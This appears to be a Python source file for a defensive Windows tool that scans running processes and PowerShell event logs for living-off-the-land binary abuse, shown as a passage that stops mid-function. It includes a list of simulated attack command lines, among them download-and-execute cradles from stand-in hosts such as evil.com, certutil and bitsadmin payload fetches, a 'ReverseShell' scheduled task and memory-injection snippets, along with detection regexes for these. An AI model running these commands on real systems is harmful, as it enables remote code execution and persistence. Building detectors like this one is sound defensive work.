"""
lolbin_analyzer.py
LOLBin Analyzer window – scans all running processes for suspicious LOLBin
usage and PowerShell scripts using the LOLBAS database.
Requires Administrator privileges to inspect command lines of all processes.
"""
import tkinter as tk
from tkinter import filedialog, messagebox
import ctypes
import sys
import os
import re
import math
import math
import threading
import time
import subprocess
import json
import random

import psutil
import lolbas_loader as lb

# ── Palette ───────────────────────────────────────────────────────────────────
BG       = "#0a0d14"
PANEL    = "#0f1420"
PANEL2   = "#111827"
ACCENT   = "#00e5ff"
ACCENT2  = "#7b2fff"
WARN     = "#ffb300"
DANGER   = "#ff3d57"
SUCCESS  = "#00ff88"
TEXT     = "#c9d1e0"
TEXT_DIM = "#4a5568"
BORDER   = "#1e2940"

FONT_H1   = ("Courier New", 16, "bold")
FONT_H2   = ("Courier New", 13, "bold")
FONT_BODY = ("Courier New", 10)
FONT_MONO = ("Courier New", 9)
FONT_BTN  = ("Courier New", 11, "bold")

# ── LOLBin process names to watch ────────────────────────────────────────────
LOLBIN_NAMES = [
    "powershell.exe", "pwsh.exe", "cmd.exe",
    "certutil.exe", "mshta.exe", "regsvr32.exe", "rundll32.exe",
    "wscript.exe", "cscript.exe", "bitsadmin.exe", "msiexec.exe",
    "wmic.exe", "schtasks.exe", "netsh.exe", "sc.exe",
]

# Script file extensions
SCRIPT_EXTENSIONS = (
    ".ps1", ".bat", ".cmd", ".vbs", ".vbe", ".js", ".jse",
    ".wsf", ".wsh", ".hta", ".sct",
)

# ── High-confidence PowerShell/CMD evasion patterns ──────────────────────────
EVASION_PATTERNS: list[tuple[re.Pattern, str, int]] = [
    (re.compile(r"-[Ee]nc(?:odedCommand)?(?:\s|$)", re.I),        "Encoded Command flag",          9),
    (re.compile(r"-[Ee]xec(?:ution)?[Pp]olicy\s+[Bb]ypass", re.I),"ExecutionPolicy Bypass",        9),
    (re.compile(r"-[Nn]o[Pp](?:rofile)?(?:\s|$)", re.I),          "NoProfile flag",                6),
    (re.compile(r"-[Nn]on[Ii](?:nteractive)?(?:\s|$)", re.I),     "NonInteractive flag",           6),
    (re.compile(r"-[Ww]indow[Ss]tyle\s+[Hh]idden", re.I),        "WindowStyle Hidden",            8),
    (re.compile(r"-[Hh]ide\b", re.I),                             "Hide window",                   7),
    (re.compile(r"\bIEX\b|\bInvoke-Expression\b", re.I),          "Invoke-Expression (IEX)",      10),
    (re.compile(r"\bInvoke-WebRequest\b|\biwr\b", re.I),          "Invoke-WebRequest",             8),
    (re.compile(r"\bDownloadString\b", re.I),                     "DownloadString cradle",         9),
    (re.compile(r"\bDownloadFile\b", re.I),                       "DownloadFile cradle",           9),
    (re.compile(r"\bNet\.WebClient\b", re.I),                     "WebClient instantiation",       8),
    (re.compile(r"\bSystem\.Reflection\.Assembly\b", re.I),       "Assembly reflection",           9),
    (re.compile(r"\bFromBase64String\b", re.I),                   "Base64 decode",                 7),
    (re.compile(r"\[Convert\]::", re.I),                          "Convert class usage",           6),
    (re.compile(r"-urlcache", re.I),                              "Certutil URL cache",            8),
    (re.compile(r"/i:http", re.I),                                "Regsvr32 remote load",          9),
    (re.compile(r"\bVirtualAlloc\b|\bVirtualProtect\b", re.I),    "Memory allocation API",        10),
    (re.compile(r"(?:[A-Za-z0-9+/]{60,}={0,2})", re.I),          "Large base64 blob",             7),
]

# ── Simulation Payloads ──────────────────────────────────────────────────────
SIM_PAYLOADS = [
    # IEX & Download
    "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
    "Invoke-WebRequest -Uri 'http://malware.org/x.exe' -OutFile 'C:\\temp\\x.exe'; Start-Process 'C:\\temp\\x.exe'",
    "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$Bytes)), [IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()",
    "$wc = New-Object System.Net.WebClient; IEX $wc.DownloadString('http://127.0.0.1/mal.ps1')",
    "Start-Job -ScriptBlock { IEX (iwr 'http://evil.local/agent') }",
    
    # Encoded/Obfuscated
    "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...",
    "powershell -ex bypass -noni -w hidden -enc IAAiAFAAYQB3AG4AZQBkACIA",
    "iex ( [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2hvYW1p')) )",
    "& ( $shellId[1]+$shellId[13]+'x')",
    "sv 1 -val 'iex'; sv 2 -val '(iwr http://evil.com)'; & (gv 1 -val) (gv 2 -val)",
    
    # Classic LOLBin wrappers
    "cmd.exe /c 'regsvr32.exe /s /u /i:http://malicious.com/payload.sct scrobj.dll'",
    "certutil.exe -urlcache -split -f http://evil.com/payload.bin C:\\temp\\payload.bin",
    "schtasks /create /sc minute /mo 1 /tn 'ReverseShell' /tr 'powershell -w hidden -c IEX (iwr http://evil.com)'",
    "wmic process call create 'powershell -enc JABiAHkAdABl......'",
    "mshta.exe http://evil.com/malicious.hta",
    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://evil.com/payload.sct\")",
    "bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/payload.exe C:\\temp\\payload.exe",
    
    # Local Execution/Bypass
    "powershell -ExecutionPolicy Unrestricted -File C:\\Windows\\Temp\\malicious.ps1",
    "Set-ExecutionPolicy Bypass -Scope Process -Force; C:\\Windows\\Temp\\payload.ps1",
    "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/meterpreter')\"",
    
    # Reflection / Memory Injection
    "[Reflection.Assembly]::Load('mscorlib').GetType('System.Runtime.InteropServices.Marshal')::VirtualAlloc(0, 4096, 0x3000, 0x40)",
    "$kernel32 = [Runtime.InteropServices.Marshal]::GetModuleHandle('kernel32.dll'); $va = [Runtime.InteropServices.Marshal]::GetProcAddress($kernel32, 'VirtualAlloc')",
    "[Byte[]]$buf = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5...",
    
    # Extra Obscure LOLBins
    "forfiles /P C:\\Windows\\System32 /M notepad.exe /C \"cmd /c powershell -c IEX (iwr http://evil.com/v)\"",
    "mavinject.exe 1234 /INJECTRUNNING C:\\temp\\evil.dll",
    "pcalua.exe -a calc.exe",
    "pcwrun.exe calc.exe",
    "syncappvpublishingserver.exe \"n; Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/s')\"",
    "bash.exe -c \"curl http://evil.com/payload | bash\"",
    "control.exe /name Microsoft.BackupAndRestore /page C:\\temp\\payload.dll",
    "cmstp.exe /s c:\\temp\\malicious.inf",
    "dfsvc.exe http://evil.com/payload.application",
    "Register-CimProvider -ProviderName EvilProvider -Namespace root\\cimv2 -Path C:\\temp\\evil.dll",
    
    # Script Engine variants
    "wscript.exe /e:VBScript C:\\temp\\payload.vbs",
    "cscript.exe //E:JScript C:\\temp\\payload.js",
    "msxsl.exe customers.xml script.xsl",
    "wmic os get /format:\"http://evil.com/payload.xsl\"",
    
    # Networking variations
    "netsh.exe add helper C:\\temp\\evil.dll",
    "sc.exe create EvilService binPath= \"cmd /c powershell -c IEX (iwr http://evil.com)\"",
    "curl.exe -s http://evil.com/payload.bat -o C:\\temp\\payload.bat && C:\\temp\\payload.bat",
    "Invoke-RestMethod -Uri http://evil.com/empire -Method Get | Invoke-Expression",
]


# ── Admin check helpers ──────────────────────────────────────────────────────

def is_admin() -> bool:
    """Return True if the current process has Administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def relaunch_as_admin():
    """Re-launch the entire application with a UAC elevation prompt."""
    try:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas",
            sys.executable,
            " ".join(f'"{a}"' for a in sys.argv),
            None, 1,  # SW_SHOWNORMAL
        )
    except Exception:
        pass
    sys.exit(0)


# ── Threat Gauge widget ──────────────────────────────────────────────────────

class ThreatGauge(tk.Canvas):
    """Semicircular arc-based threat gauge (0–100)."""

    def __init__(self, master, size=200, **kw):
        super().__init__(master, width=size, height=size // 2 + 30,
                         bg=BG, highlightthickness=0, **kw)
        self._size  = size
        self._value = 0
        self._draw()

    def _draw(self):
        s = self._size
        cx, cy = s // 2, s // 2
        r = s // 2 - 10
        self.delete("all")

        self.create_arc(cx - r, cy - r, cx + r, cy + r,
                        start=180, extent=-180, style="arc",
                        outline=BORDER, width=14)

        pct = self._value / 100.0
        extent = -(pct * 180)
        color = SUCCESS if pct < 0.4 else (WARN if pct < 0.7 else DANGER)

        if pct > 0:
            self.create_arc(cx - r, cy - r, cx + r, cy + r,
                            start=180, extent=extent, style="arc",
                            outline=color, width=12)

        angle_rad = math.radians(pct * 180)
        nx = cx + (r - 18) * math.cos(math.pi - angle_rad)
        ny = cy - (r - 18) * math.sin(math.pi - angle_rad)
        self.create_line(cx, cy, nx, ny, fill="white", width=3, capstyle="round")
        self.create_oval(cx - 5, cy - 5, cx + 5, cy + 5, fill=ACCENT, outline="")

        self.create_text(cx, cy + 22, text=f"{self._value}",
                         font=("Courier New", 20, "bold"), fill=color)
        self.create_text(cx, cy + 42, text="THREAT SCORE",
                         font=("Courier New", 8), fill=TEXT_DIM)

    def set_value(self, v: float):
        self._value = max(0, min(100, int(v)))
        self._draw()

    def animate_to(self, target: float, steps=25, delay=25):
        self._smooth(self._value, max(0, min(100, target)), steps, delay)

    def _smooth(self, cur, tgt, steps, delay):
        if steps <= 0:
            self.set_value(tgt)
            return
        nxt = cur + (tgt - cur) / steps
        self.set_value(nxt)
        self.after(delay, lambda: self._smooth(nxt, tgt, steps - 1, delay))


class LolbinAnalyzerWindow(tk.Toplevel):
    """LOLBin live process scanner with LOLBAS cross-reference."""

    def __init__(self, parent):
        super().__init__(parent)
        self.parent = parent
        self.title("LOLBin Analyzer – CLASH Analyzer")
        self.geometry("1920x1080")
        self.minsize(1000, 700)
        self.configure(bg=BG)
        self.resizable(True, True)

        self._db           = {}
        self._binary_names = []
        self._findings     = []
        self._auto_scan    = False
        self._auto_id      = None        # after() id for auto-scan loop

        # ── Admin check ──────────────────────────────────────────────────────
        if not is_admin():
            ans = messagebox.askyesno(
                "Administrator Required",
                "LOLBin Analyzer needs Administrator privileges to inspect "
                "all running process command lines.\n\n"
                "Restart with elevated privileges?",
                parent=self,
            )
            if ans:
                relaunch_as_admin()
            else:
                messagebox.showwarning(
                    "Limited Mode",
                    "Running without admin.\n"
                    "Some processes may not be visible.",
                    parent=self,
                )

        self._build_ui()
        self._load_db_async()

    # ─────────────────────────────────────────── UI ──────────────────────────

    def _build_ui(self):
        # ── Top bar ─────────────────────────────────────────────────────────
        topbar = tk.Frame(self, bg=PANEL, height=52)
        topbar.pack(fill="x")
        topbar.pack_propagate(False)

        tk.Button(topbar, text="← Back", font=FONT_BTN,
                  fg=TEXT, bg=PANEL, activebackground=BORDER,
                  relief="flat", cursor="hand2",
                  command=self._go_back).pack(side="left", padx=16, pady=8)

        tk.Label(topbar, text="⚡  LOLBIN ANALYZER  —  LIVE PROCESS SCANNER",
                 font=FONT_H1, fg=ACCENT2, bg=PANEL).pack(side="left")

        # Admin badge
        if is_admin():
            badge_text, badge_fg = "🛡  ADMIN", SUCCESS
        else:
            badge_text, badge_fg = "⚠  LIMITED", WARN
        tk.Label(topbar, text=badge_text, font=FONT_MONO,
                 fg=badge_fg, bg=PANEL).pack(side="right", padx=(0, 12))

        self.db_status = tk.Label(topbar, text="Loading DB…",
                                  font=FONT_MONO, fg=WARN, bg=PANEL)
        self.db_status.pack(side="right", padx=12)

        # ── Body: left (process list + controls) │ right (gauge + report)  ──
        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True, padx=24, pady=16)
        body.columnconfigure(0, weight=1)
        body.columnconfigure(1, weight=0, minsize=360)
        body.rowconfigure(0, weight=1)

        # ── LEFT: Embedded PowerShell CLI Terminal ─────────────────────────────
        left = tk.Frame(body, bg=PANEL)
        left.grid(row=0, column=0, sticky="nsew", padx=(0, 12))

        cli_header = tk.Frame(left, bg=PANEL)
        cli_header.pack(fill="x", padx=16, pady=(14, 4))
        tk.Label(cli_header, text="◉  POWERSHELL  CLI",
                 font=FONT_H2, fg=SUCCESS, bg=PANEL).pack(side="left")

        self.proc_count_lbl = tk.Label(cli_header, text="",
                                       font=FONT_MONO, fg=TEXT_DIM, bg=PANEL)
        self.proc_count_lbl.pack(side="right")

        # Terminal output area
        term_frame = tk.Frame(left, bg="#000000", bd=2, relief="sunken")
        term_frame.pack(fill="both", expand=True, padx=16, pady=(4, 4))

        self.terminal = tk.Text(term_frame,
                                bg="#0c0c0c", fg="#cccccc",
                                insertbackground=SUCCESS,
                                selectbackground="#264f78",
                                font=("Consolas", 10),
                                relief="flat", padx=8, pady=6,
                                wrap="word", state="disabled",
                                cursor="arrow")
        tscroll = tk.Scrollbar(term_frame, orient="vertical",
                               command=self.terminal.yview)
        self.terminal.configure(yscrollcommand=tscroll.set)
        tscroll.pack(side="right", fill="y")
        self.terminal.pack(fill="both", expand=True)

        # Terminal text tags
        self.terminal.tag_configure("prompt",
                                     foreground="#1e90ff",
                                     font=("Consolas", 10, "bold"))
        self.terminal.tag_configure("cmd",
                                     foreground="#e5e510",
                                     font=("Consolas", 10))
        self.terminal.tag_configure("output",
                                     foreground="#cccccc",
                                     font=("Consolas", 10))
        self.terminal.tag_configure("error",
                                     foreground="#f14c4c",
                                     font=("Consolas", 10, "bold"))
        self.terminal.tag_configure("success",
                                     foreground="#23d18b",
                                     font=("Consolas", 10, "bold"))
        self.terminal.tag_configure("warn",
                                     foreground="#e5e510",
                                     font=("Consolas", 10, "bold"))
        self.terminal.tag_configure("highlight",
                                     foreground="#ff3d57",
                                     background="#2a0a0a",
                                     font=("Consolas", 10, "bold"))
        self.terminal.tag_configure("info",
                                     foreground="#3b8eea",
                                     font=("Consolas", 10))
        self.terminal.tag_configure("dim",
                                     foreground="#6a6a6a",
                                     font=("Consolas", 10))


        # ── Control buttons ──────────────────────────────────────────────────
        ctrl = tk.Frame(left, bg=PANEL)
        ctrl.pack(fill="x", padx=16, pady=(4, 16))

        self.scan_btn = tk.Button(ctrl, text="🔍  SCAN NOW",
                                  font=FONT_BTN, fg=BG, bg=ACCENT2,
                                  activebackground=TEXT, relief="flat",
                                  cursor="hand2", padx=20, pady=10,
                                  command=self._scan)
        self.scan_btn.pack(side="left", padx=(0, 8))

        self.auto_btn = tk.Button(ctrl, text="⟳  AUTO-SCAN: OFF",
                                  font=FONT_BTN, fg=TEXT, bg=BORDER,
                                  activebackground=PANEL2, relief="flat",
                                  cursor="hand2", padx=16, pady=10,
                                  command=self._toggle_auto_scan)
        self.auto_btn.pack(side="left", padx=(0, 8))

        self.export_btn = tk.Button(ctrl, text="⬇  EXPORT",
                                    font=FONT_BTN, fg=BG, bg=ACCENT,
                                    activebackground=TEXT, relief="flat",
                                    cursor="hand2", padx=16, pady=10,
                                    state="disabled",
                                    command=self._export_report)
        self.export_btn.pack(side="right")

        self.scan_status = tk.Label(ctrl, text="", font=FONT_MONO,
                                    fg=TEXT_DIM, bg=PANEL)
        self.scan_status.pack(side="right", padx=12)

        # ── Print welcome in terminal ────────────────────────────────────────
        self._term_write("  LOLBin Analyzer — PowerShell Process Scanner\n", "info")
        self._term_write("  ═══════════════════════════════════════════════\n", "dim")
        self._term_write("  Type PowerShell commands below or press ", "dim")
        self._term_write("SCAN NOW", "success")
        self._term_write(" to detect LOLBins.\n\n", "dim")

        # ── RIGHT: Gauge + Report ────────────────────────────────────────────
        right = tk.Frame(body, bg=PANEL)
        right.grid(row=0, column=1, sticky="nsew")

        tk.Label(right, text="THREAT GAUGE",
                 font=FONT_H2, fg=ACCENT2, bg=PANEL).pack(pady=(14, 4))

        self.gauge = ThreatGauge(right, size=200)
        self.gauge.pack()

        self.score_label = tk.Label(right, text="",
                                    font=FONT_MONO, fg=TEXT_DIM, bg=PANEL)
        self.score_label.pack(pady=(2, 12))

        sep = tk.Canvas(right, height=2, bg=PANEL, highlightthickness=0)
        sep.pack(fill="x", padx=16)
        sep.create_line(0, 1, 9999, 1, fill=BORDER, width=2)

        rep_header = tk.Frame(right, bg=PANEL)
        rep_header.pack(fill="x", padx=16, pady=(10, 4))
        tk.Label(rep_header, text="ANALYSIS REPORT",
                 font=FONT_H2, fg=ACCENT, bg=PANEL).pack(side="left")
        self.find_count_lbl = tk.Label(rep_header, text="",
                                       font=FONT_MONO, fg=TEXT_DIM, bg=PANEL)
        self.find_count_lbl.pack(side="right")

        report_frame = tk.Frame(right, bg=BORDER)
        report_frame.pack(fill="both", expand=True, padx=16, pady=(0, 16))

        self.report_text = tk.Text(report_frame,
                                   bg=PANEL2, fg=TEXT,
                                   font=("Courier New", 9),
                                   relief="flat", wrap="word",
                                   state="disabled",
                                   padx=10, pady=8)
        rscroll = tk.Scrollbar(report_frame, orient="vertical",
                                command=self.report_text.yview)
        self.report_text.configure(yscrollcommand=rscroll.set)
        rscroll.pack(side="right", fill="y")
        self.report_text.pack(fill="both", expand=True)

        self.report_text.tag_configure("header",   foreground=ACCENT,  font=("Courier New", 10, "bold"))
        self.report_text.tag_configure("finding",  foreground=WARN,    font=("Courier New", 9, "bold"))
        self.report_text.tag_configure("critical", foreground=DANGER,  font=("Courier New", 9, "bold"))
        self.report_text.tag_configure("mitre",    foreground=ACCENT2, font=("Courier New", 9))
        self.report_text.tag_configure("detail",   foreground=TEXT,    font=("Courier New", 9))
        self.report_text.tag_configure("dim",      foreground=TEXT_DIM,font=("Courier New", 9))
        self.report_text.tag_configure("sep",      foreground=BORDER,  font=("Courier New", 9))
        self.report_text.tag_configure("ok",       foreground=SUCCESS, font=("Courier New", 9, "bold"))

        self._append_report("LOLBin Analyzer ready.\n", "header")
        self._append_report("─" * 42 + "\n", "sep")
        self._append_report("Click SCAN NOW to inspect running processes.\n\n", "dim")
        self._append_report("Detection covers:\n", "detail")
        self._append_report("• PowerShell scripts (.ps1) in arguments\n", "detail")
        self._append_report("• Encoded command flags (-enc)\n", "detail")
        self._append_report("• ExecutionPolicy bypass attempts\n", "detail")
        self._append_report("• Download cradles (IEX, WebClient)\n", "detail")
        self._append_report("• Hidden window execution\n", "detail")
        self._append_report("• LOLBAS binary abuse patterns\n", "detail")
        self._append_report("• Memory injection APIs\n", "detail")

    # ─────────────────────────────────────────── Helpers ─────────────────────

    def _load_db_async(self):
        def _load():
            try:
                self._db = lb.load_database()
                self._binary_names = lb.get_all_binary_names()
                self.after(0, lambda: self.db_status.config(
                    text=f"● DB — {len(self._db)} entries", fg=SUCCESS))
            except Exception as e:
                self.after(0, lambda: self.db_status.config(
                    text=f"DB Error: {e}", fg=DANGER))
        threading.Thread(target=_load, daemon=True).start()

    def _append_report(self, text, tag="detail"):
        self.report_text.configure(state="normal")
        self.report_text.insert("end", text, tag)
        self.report_text.see("end")
        self.report_text.configure(state="disabled")

    def _clear_report(self):
        self.report_text.configure(state="normal")
        self.report_text.delete("1.0", "end")
        self.report_text.configure(state="disabled")

    # ── Terminal helpers ─────────────────────────────────────────────────

    def _term_write(self, text: str, tag: str = "output"):
        """Append text to the embedded terminal."""
        self.terminal.configure(state="normal")
        self.terminal.insert("end", text, tag)
        self.terminal.see("end")
        self.terminal.configure(state="disabled")

    def _term_clear(self):
        """Clear terminal output."""
        self.terminal.configure(state="normal")
        self.terminal.delete("1.0", "end")
        self.terminal.configure(state="disabled")


    # ─────────────────────────────────────────── Scanning ────────────────────

    def _scan(self):
        """Launch scan in background thread."""
        self.scan_btn.config(state="disabled")
        self.scan_status.config(text="⏳ Scanning…", fg=WARN)
        threading.Thread(target=self._scan_worker, daemon=True).start()

    # ── Data-collection helpers (called from worker thread) ──────────────

    def _get_wmi_processes(self) -> dict[int, dict]:
        """Use WMI to get command lines — more reliable than psutil on Windows."""
        result_map: dict[int, dict] = {}
        try:
            ps_cmd = (
                'Get-CimInstance Win32_Process | '
                'Select-Object ProcessId, Name, CommandLine, ParentProcessId | '
                'ConvertTo-Json -Compress'
            )
            r = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", ps_cmd],
                capture_output=True, text=True, timeout=15,
            )
            if r.returncode == 0 and r.stdout.strip():
                data = json.loads(r.stdout)
                if isinstance(data, dict):
                    data = [data]
                for p in data:
                    name = (p.get("Name") or "").lower()
                    if name in [n.lower() for n in LOLBIN_NAMES]:
                        pid = p.get("ProcessId", 0)
                        result_map[pid] = {
                            "pid":     pid,
                            "name":    p.get("Name", ""),
                            "cmdline": p.get("CommandLine") or "",
                            "ppid":    p.get("ParentProcessId", 0),
                            "source":  "WMI",
                        }
        except Exception:
            pass
        return result_map

    def _get_psutil_processes(self) -> dict[int, dict]:
        """Fallback: use psutil for command lines."""
        result_map: dict[int, dict] = {}
        for proc in psutil.process_iter(["pid", "name"]):
            try:
                name = proc.info["name"] or ""
                if name.lower() not in [n.lower() for n in LOLBIN_NAMES]:
                    continue
                pid = proc.info["pid"]
                try:
                    cmdline = " ".join(proc.cmdline())
                except (psutil.AccessDenied, psutil.ZombieProcess):
                    cmdline = ""
                result_map[pid] = {
                    "pid":     pid,
                    "name":    name,
                    "cmdline": cmdline,
                    "ppid":    0,
                    "source":  "psutil",
                }
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return result_map

    def _get_event_log_scripts(self) -> list[dict]:
        """
        Query PowerShell event logs for recently executed scripts.
        Reads:
          • 'Windows PowerShell' Event ID 400 (HostApplication = full cmd)
          • 'Windows PowerShell' Event ID 800 (pipeline details)
          • 'Microsoft-Windows-PowerShell/Operational' Event ID 4104 (script blocks)
        """
        scripts: list[dict] = []
        # ── Classic log: Engine lifecycle & pipeline events ───────────────
        try:
            ps_cmd = (
                "Get-WinEvent -LogName 'Windows PowerShell' -MaxEvents 200 "
                "2>$null | Where-Object { $_.Id -eq 400 -or $_.Id -eq 800 } | "
                "ForEach-Object { [PSCustomObject]@{ "
                "  TimeCreated = $_.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss'); "
                "  Id = $_.Id; "
                "  Msg = $_.Message.Substring(0, [Math]::Min(800, $_.Message.Length)) "
                "} } | ConvertTo-Json -Compress"
            )
            r = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", ps_cmd],
                capture_output=True, text=True, timeout=15,
            )
            if r.returncode == 0 and r.stdout.strip():
                data = json.loads(r.stdout)
                if isinstance(data, dict):
                    data = [data]
                for evt in data:
                    msg = evt.get("Msg", "")
                    self._extract_scripts_from_event(
                        msg, evt.get("TimeCreated", ""),
                        evt.get("Id", 0), scripts)
        except Exception:
            pass

        # ── Operational log: ScriptBlock logging (4104) ──────────────────
        try:
            ps_cmd = (
                "Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' "
                "-MaxEvents 100 2>$null | Where-Object { $_.Id -eq 4104 } | "
                "ForEach-Object { [PSCustomObject]@{ "
                "  TimeCreated = $_.TimeCreated.ToString('yyyy-MM-dd HH:mm:ss'); "
                "  Id = $_.Id; "
                "  Msg = $_.Message.Substring(0, [Math]::Min(800, $_.Message.Length)) "
                "} } | ConvertTo-Json -Compress"
            )
            r = subprocess.run(
                ["powershell.exe", "-NoProfile", "-Command", ps_cmd],
                capture_output=True, text=True, timeout=15,
            )
            if r.returncode == 0 and r.stdout.strip():
                data = json.loads(r.stdout)
                if isinstance(data, dict):
                    data = [data]
                for evt in data:
                    msg = evt.get("Msg", "")
                    self._extract_scripts_from_event(
                        msg, evt.get("TimeCreated", ""),
                        evt.get("Id", 0), scripts)
        except Exception:
            pass

        # Deduplicate by script path
        seen = set()
        unique: list[dict] = []
        for s in scripts:
            key = s.get("script", "")
            if key and key not in seen:
                seen.add(key)
                unique.append(s)
        return unique

    # ── Main scan worker (runs in background thread) ─────────────────────

    def _scan_worker(self):
        """Collect data from WMI + psutil + Event Logs, then report."""
        # Phase 1: WMI command lines (most reliable on Windows)
        wmi_procs = self._get_wmi_processes()

        # Phase 2: psutil fallback — fill gaps
        ps_procs = self._get_psutil_processes()
        for pid, info in ps_procs.items():
            if pid not in wmi_procs:
                wmi_procs[pid] = info
            elif not wmi_procs[pid]["cmdline"] and info["cmdline"]:
                wmi_procs[pid]["cmdline"] = info["cmdline"]

        all_procs = wmi_procs

        # Phase 3: Event log scripts (captures actual commands running in PS)
        event_scripts = self._get_event_log_scripts()

        # Post results back to UI thread
        self.after(0, lambda: self._process_results(all_procs, event_scripts))

    @staticmethod
    def _extract_scripts_from_event(msg: str, time_str: str,
                                     event_id: int,
                                     out: list[dict]):
        """Parse event message text for script blocks and PowerShell commands."""
        # For Event 400 (Engine lifecycle), look for HostApplication
        if event_id == 400:
            for line in msg.splitlines():
                stripped = line.strip()
                if stripped.lower().startswith("hostapplication"):
                    _, _, val = stripped.partition("=")
                    val = val.strip()
                    if val and "powershell.exe" not in val.lower() or len(val) > 20:
                        out.append({
                            "time":     time_str,
                            "event_id": event_id,
                            "script":   val,
                            "source":   "EventLog-400 (HostApplication)",
                        })
                        return

        # For Event 4104 (ScriptBlock Logging), the message IS the command/script
        elif event_id == 4104:
            # We strip out standard Microsoft noise logs (e.g., prompt functions)
            clean_msg = msg.strip()
            if not clean_msg.startswith("prompt") and "Out-Default" not in clean_msg:
                out.append({
                    "time":     time_str,
                    "event_id": event_id,
                    "script":   clean_msg,
                    "source":   "EventLog-4104 (ScriptBlock)",
                })
        
        # Fallback for 800 (Pipeline Execution)
        elif event_id == 800:
            # Pipeline details are often noisy, but we can capture the raw text
            clean_msg = msg.strip().replace("\n", " ")
            if clean_msg:
                out.append({
                    "time":     time_str,
                    "event_id": event_id,
                    "script":   clean_msg,
                    "source":   "EventLog-800 (Pipeline)",
                })

    def _process_results(self, all_procs: dict, event_scripts: list[dict]):
        """Analyze merged process data + event log data and build the report."""
        self._clear_report()
        self._findings = []
        self.scan_btn.config(state="normal")

        # Initialize tracking variables
        total_risk   = 0
        lolbin_hits  = []
        evasion_hits = []
        script_hits  = []
        proc_count   = len(all_procs)

        self._append_report("─" * 42 + "\n", "sep")
        self._append_report("  LIVE PROCESS SCAN\n", "header")
        self._append_report("─" * 42 + "\n\n", "sep")

        # ── Write scan results to terminal as CLI output ────────────────────
        self._term_clear()
        self._term_write("PS> ", "prompt")
        self._term_write("Get-Process | Where-Object { LOLBin-Check }\n\n", "cmd")

        self._term_write(f"  Scanning {proc_count} LOLBin process(es) + "
                         f"PowerShell Scripts/Commands...\n", "info")
        self._term_write("  " + "═" * 70 + "\n\n", "dim")

        # ── Section 1: Running LOLBin Processes ─────────────────────────────
        self._term_write("  ┌─ RUNNING PROCESSES ", "info")
        self._term_write("─" * 50 + "┐\n", "dim")
        self._term_write(
            f"  │ {'PID':>7}  {'PROCESS':<18} {'STATUS':<14} "
            f"COMMAND LINE\n", "info")
        self._term_write("  │ " + "─" * 85 + "\n", "dim")

        if proc_count == 0:
            self._term_write("  │  (no LOLBin processes currently running)\n", "dim")
        else:
            for pid, info in all_procs.items():
                name     = info["name"]
                full_cmd = info["cmdline"] or name
                cmdline_parts = full_cmd.split()
                is_suspicious = False
                reasons = []

                # ── Check 1: Script file in command line
                for ext in SCRIPT_EXTENSIONS:
                    if ext in full_cmd.lower():
                        m = re.search(
                            r'[A-Za-z]:\\[^\s"\'<>|]+' + re.escape(ext),
                            full_cmd, re.IGNORECASE)
                        if m:
                            script_path = m.group(0)
                        else:
                            m2 = re.search(r'[\w.\-\\/:]+' + re.escape(ext),
                                           full_cmd, re.IGNORECASE)
                            script_path = m2.group(0) if m2 else f"({ext} script)"
                        reasons.append(f"Script: {os.path.basename(script_path)}")
                        script_hits.append({
                            "pid": pid, "name": name,
                            "script": script_path, "cmd": full_cmd,
                        })
                        is_suspicious = True

                # ── Check 2: LOLBAS DB cross-reference
                bare = name.lower().replace(".exe", "").replace(".dll", "")
                entry = lb.lookup(bare) or lb.lookup(name.lower()) or {}
                if entry and len(cmdline_parts) > 1:
                    risk = entry.get("max_risk", 4)
                    lolbin_hits.append({
                        "pid": pid, "name": entry.get("name", name),
                        "risk": risk, "entry": entry, "cmd": full_cmd,
                    })
                    total_risk = max(total_risk, risk)

                # ── Check 3: Evasion patterns
                for pat, label, risk in EVASION_PATTERNS:
                    m = pat.search(full_cmd)
                    if m:
                        is_suspicious = True
                        reasons.append(label)
                        evasion_hits.append({
                            "pid": pid, "name": name, "label": label,
                            "risk": risk, "match": m.group(0).strip(),
                            "cmd": full_cmd,
                        })
                        total_risk = max(total_risk, risk)

                # ── Terminal row
                if is_suspicious:
                    status, tag = "⚠ SUSPICIOUS", "highlight"
                elif len(cmdline_parts) > 1:
                    status, tag = "● ACTIVE", "warn"
                else:
                    status, tag = "○ IDLE", "dim"

                cmd_display = full_cmd[:90] + ("…" if len(full_cmd) > 90 else "")
                self._term_write(f"  │ {pid:>7}  {name:<18} {status:<14} ", tag)
                self._term_write(f"{cmd_display}\n",
                                 "output" if tag == "dim" else tag)
                for r in reasons:
                    self._term_write(
                        f"  │ {'':>7}  {'':>18} {'↳':>14} {r}\n", "error")

        self._term_write("  └" + "─" * 89 + "┘\n\n", "dim")

        # ── Section 2: PowerShell Scripts / Engine Commands ─────────────────
        suspicious_scripts = []
        if event_scripts:
            self._term_write("  ┌─ POWERSHELL ENGINE COMMANDS / SCRIPTS ", "info")
            self._term_write("─" * 31 + "┐\n", "dim")

            for i, es in enumerate(event_scripts):
                cmd_text = es["script"]
                cmd_risk = 0
                cmd_labels = []

                # Evaluate risk
